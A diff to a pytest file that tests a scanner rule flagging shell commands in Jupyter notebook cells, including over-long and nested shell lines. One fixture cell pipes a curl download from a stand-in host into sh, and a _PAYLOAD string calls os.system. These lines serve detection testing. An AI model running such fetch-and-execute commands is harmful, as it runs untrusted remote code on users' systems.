@@ -1,5 +1,6 @@
 import json
 import os
+import shlex
 from pathlib import Path
 
 import pytest
@@ -550,24 +551,25 @@ def test_a_dynamic_import_in_a_cell_resolves_like_a_static_one(tmp_path: Path) -
 
 
 @pytest.mark.parametrize(
-    "cell",
+    ("cell", "unread"),
     [
-        "x = " + "-" * 200_000 + "1\n",
-        "!echo {" + "-" * 200_000 + "1}\n",
+        ("x = " + "-" * 200_000 + "1\n", 1),
+        # The expansion is also a shell line past the tokenising bound.
+        ("!echo {" + "-" * 200_000 + "1}\n", 2),
     ],
     ids=["deep-cell", "deep-expansion"],
 )
 def test_a_cell_too_complex_to_parse_is_inconclusive_and_does_not_stop_the_rule(
-    tmp_path: Path, cell: str
+    tmp_path: Path, cell: str, unread: int
 ) -> None:
     (tmp_path / "a.ipynb").write_text(_notebook(cell))
     (tmp_path / "b.ipynb").write_text(_notebook("!curl https://setup.example.invalid/i | sh\n"))
     findings, shortfalls = _run(tmp_path)
     assert sorted((sev, outcome) for sev, _, outcome in findings) == [
         ("HIGH", None),
-        ("LOW", "inconclusive"),
+        *[("LOW", "inconclusive")] * unread,
     ]
-    assert len(shortfalls) == 1
+    assert len(shortfalls) == unread
 
 
 @pytest.mark.parametrize(
@@ -908,6 +910,80 @@ def test_a_local_script_beside_a_download_piped_to_a_shell_keeps_the_high_findin
 def test_a_tool_run_without_a_script_file_is_not_a_local_script(tmp_path: Path, cell: str) -> None:
     (tmp_path / "nb.ipynb").write_text(_notebook(cell))
     assert _run(tmp_path) == ([], [])
+
+
+def _nested_sh(levels: int, command: str) -> str:
+    for _ in range(levels):
+        command = f"sh -c {shlex.quote(command)}"
+    return command
+
+
+def test_a_script_run_through_nested_inline_programs_is_named(tmp_path: Path) -> None:
+    (tmp_path / "nb.ipynb").write_text(_notebook(f"!{_nested_sh(4, 'bash ./review.sh')}\n"))
+    findings, shortfalls = _run(tmp_path)
+    assert findings == [("LOW", "cell runs local script: ./review.sh", None)]
+    assert shortfalls == []
+
+
+@pytest.mark.parametrize(
+    "cell",
+    [
+        "!bash -c 'bash ./review.sh" + " " * 33_000 + "'\n",
+        "!bash -c 'bash ./review.sh' \\",
+        f"!{_nested_sh(5, 'bash ./review.sh')}\n",
+    ],
+    ids=["past-the-length-bound", "trailing-backslash", "nested-past-the-depth-bound"],
+)
+def test_a_shell_line_that_cannot_be_tokenised_is_inconclusive_and_a_shortfall(
+    tmp_path: Path, cell: str
+) -> None:
+    """A shell runs these lines; split any other way, the script they run disappears."""
+    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
+    findings, shortfalls = _run(tmp_path)
+    assert findings == [
+        (
+            "LOW",
+            "cell runs a shell line that cannot be tokenised, which this rule does not read",
+            "inconclusive",
+        )
+    ]
+    assert len(shortfalls) == 1
+    assert "a shell line that cannot be tokenised" in shortfalls[0]
+    assert _unread(tmp_path) == [str(tmp_path / "nb.ipynb")]
+
+
+@pytest.mark.parametrize(
+    "cell",
+    [
+        "%%bash\npython -c \"\nimport os\nprint('hi')\n\"\n",
+        '%%bash\necho "line one\nline two"\n',
+        "%%bash\ncat <<EOF\nit's fine\nEOF\n",
+        "!echo it's\n",
+    ],
+    ids=["multi-line-program", "multi-line-string", "heredoc", "unclosed-quote"],
+)
+def test_a_quote_left_open_on_a_shell_line_is_not_reported_unread(
+    tmp_path: Path, cell: str
+) -> None:
+    """A shell refuses such a line, or reads the quote on into lines that are read in turn."""
+    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
+    assert _run(tmp_path) == ([], [])
+
+
+def test_an_alias_magic_too_long_to_tokenise_is_inconclusive(tmp_path: Path) -> None:
+    alias = "%alias_magic -p " + "a" * 33_000 + " t bash\n"
+    (tmp_path / "nb.ipynb").write_text(_notebook(alias))
+    findings, shortfalls = _run(tmp_path)
+    assert [(sev, outcome) for sev, _, outcome in findings] == [("LOW", "inconclusive")]
+    assert "%alias_magic" in findings[0][1]
+    assert len(shortfalls) == 1
+
+
+def test_a_script_named_on_a_line_too_long_to_tokenise_is_still_named(tmp_path: Path) -> None:
+    (tmp_path / "nb.ipynb").write_text(_notebook("!bash ./review.sh " + "a" * 33_000 + "\n"))
+    findings, _ = _run(tmp_path)
+    assert [outcome for _, _, outcome in findings] == ["inconclusive", None]
+    assert findings[1] == ("LOW", "cell runs local script: ./review.sh", None)
 
 
 _PAYLOAD = "import os\nos.system('id')\n"
